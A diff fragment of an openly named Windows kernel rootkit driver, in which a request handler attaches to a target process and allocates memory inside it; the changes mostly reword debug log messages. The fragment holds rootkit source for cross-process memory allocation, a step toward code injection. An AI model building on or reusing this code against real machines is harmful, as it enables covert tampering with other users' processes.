-		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - CANNOT GET EPROCESS (%hu) :(\n", RootkInst->MainPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (cannot get EPROCESS of process %hu)\n", RootkInst->MainPID);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
-	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST SOURCE (%s, %hu)\n", RootkInst->MdlName, RootkInst->MainPID);
 
-
-	// Allocate the needed memory -
-	KeStackAttachProcess(Process, &PrcState);  // attach to the process
+	// Allocate the needed memory:
+	KeStackAttachProcess(Process, &PrcState);
 	RootkInst->Out = general::AllocateMemoryADD(InitialAddress, AllocSize, &PrcState, ZeroBits);
 	if (RootkInst->Out == NULL) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - ALLOCATION OF MEMORY FAILED :(\n");
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (actual allocation of memory failed)\n");
 		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
-
-	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST SUCCESS (RANGE ALLIGNED TO %p FROM %p)\n", RootkInst->Out, InitialAddress);
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process succeeded (memory base alligned from %p to %p)\n", RootkInst->Out, InitialAddress);
 	return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
